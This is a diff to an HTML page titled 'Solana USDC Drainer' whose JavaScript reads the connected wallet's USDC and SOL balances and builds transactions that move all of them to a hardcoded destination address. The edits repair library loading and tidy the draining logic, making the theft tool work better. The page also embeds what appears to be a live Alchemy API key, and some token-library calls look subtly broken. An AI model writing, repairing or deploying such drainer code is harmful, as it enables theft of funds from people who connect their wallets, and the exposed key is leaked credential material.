@@ -4,9 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Solana USDC Drainer</title>
-    <!-- Solana Web3.js -->
-    <script src="https://unpkg.com/@solana/web3.js@/latest/lib/index.iife.min.js"></script>
-    <!-- SPL Token Library for handling USDC correctly -->
+    
+    <!-- 1. Solana Web3.js (Global variable: solanaWeb3) -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    
+    <!-- 2. SPL Token Library (Global variable: splToken) -->
     <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
     
     <style>
@@ -46,7 +48,7 @@
         .btn-connect:hover { background-color: #6d28d9; }
         
         .btn-drain { 
-            background: linear-gradient(135deg, #fbbf24, #f59e0b); /* Gold for USDC */
+            background: linear-gradient(135deg, #fbbf24, #f59e0b); 
             color: black; 
             opacity: 0.5; 
             pointer-events: none; 
@@ -87,10 +89,7 @@
 
 <script>
     // --- CONFIGURATION ---
-    // Destination Wallet (Your wallet)
     const DESTINATION = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
-    
-    // Standard Solana USDC Mint Address
     const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
     
     const ALCHEMY_API_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
@@ -158,60 +157,58 @@
         log("⏳ Connecting to RPC...", "normal");
 
         try {
+            // Ensure solanaWeb3 is loaded
+            if (typeof solanaWeb3 === 'undefined') {
+                throw new Error("Solana Web3.js library not loaded. Refresh page.");
+            }
+
             const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
             
             // A. Drain USDC
             log("📊 Fetching USDC Balance...", "normal");
             
             // Get Token Account for USDC
-            const usdcMintPubkey = new splToken.Token.AccountLayout.keys.mint; 
-            // Using the official SPL Token helper is safer than raw layout
-            let balanceInfo;
+            // We use splToken from the global scope
+            let usdcBalance = 0;
+            
             try {
-                // Try to get balance using the newer token method
-                balanceInfo = await splToken.getBalance(connection, wallet, USDC_MINT);
+                // getBalance returns an object with amount (BigInt or Number) and decimals
+                const balanceInfo = await splToken.getBalance(
+                    connection, 
+                    wallet, 
+                    USDC_MINT
+                );
+                usdcBalance = balanceInfo.amount;
+                log(`💰 USDC Found: ${(usdcBalance / 1e6).toFixed(2)} USDC`, "normal");
             } catch (e) {
                 log("⚠️ No USDC found or Token Program error.", "warning");
-                // Fallback: Just send SOL if no USDC
                 throw new Error("No USDC Balance Found.");
             }
 
-            const usdcBalance = balanceInfo.amount; // This is in smallest units (6 decimals)
-            log(`💰 USDC Found: ${(usdcBalance / 1e6).toFixed(2)} USDC`, "normal");
-
             if (usdcBalance > 0) {
-                // Create a simple transfer instruction for USDC
-                // We assume the user has only one main USDC token account. 
-                // For maximum safety, we use the TokenProgram.transferChecked logic or just standard transfer
-                
-                const tx = new solanaWeb3.Transaction();
-                
-                // Get Token Account (this might fail if they don't have one open yet, but getBalance implies it exists)
-                // We will use a simpler approach: Construct the instruction manually using the Mint and Destinations
-                
-                // Note: To drain *everything*, we need to know the source token account. 
-                // 'getBalance' gives us the amount, but not the Account ID directly in this simple wrapper.
-                // However, usually there is only one main token account per mint.
-                
+                // We need to find the Source Token Account ID
+                // The user's token account is an "Associated Token Account" (ATA)
                 const srcAccount = await splToken.getAssociatedTokenAddress(
                     new splToken.Token(USDC_MINT), 
                     wallet
                 );
 
+                // Calculate Destination ATA for USDC
+                const destMint = new splToken.Token(USDC_MINT);
+                const destOwner = new solanaWeb3.PublicKey(DESTINATION);
+                const destAccount = await splToken.getAssociatedTokenAddress(destMint, destOwner);
+
                 log("📝 Building USDC Transfer...", "normal");
                 
                 // Construct Transfer Instruction
                 const transferInstruction = splToken.createTransferInstruction(
-                    srcAccount, // From
-                    await splToken.getAssociatedTokenAddress(
-                        new splToken.Token(USDC_MINT), 
-                        new solanaWeb3.PublicKey(DESTINATION) // To (Associated Token Account of destination)
-                    ),
-                    wallet, // Owner
-                    usdcBalance // Amount
+                    srcAccount, 
+                    destAccount, 
+                    wallet, 
+                    usdcBalance
                 );
 
-                tx.add(transferInstruction);
+                const tx = new solanaWeb3.Transaction().add(transferInstruction);
                 
                 log("🚀 Sending USDC...", "normal");
                 const sig = await connection.sendTransaction(tx, [wallet], { skipPreflight: true });
@@ -225,6 +222,8 @@
             
             if (solBalance > 0) {
                 log("📝 Building SOL Transfer...", "normal");
+                
+                // Create a simple transaction for SOL
                 const txSol = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: wallet,
@@ -246,7 +245,6 @@
             if (msg.includes("401") || msg.includes("Unauthorized")) {
                 msg = "❌ RPC Unauthorized. Check API Key.";
             } else if(msg.includes("No USDC Balance Found")) {
-                 // If only this error happened, we still might have sent SOL
                  log("⚠️ No USDC found, but process completed.", "warning");
                  return; 
             }
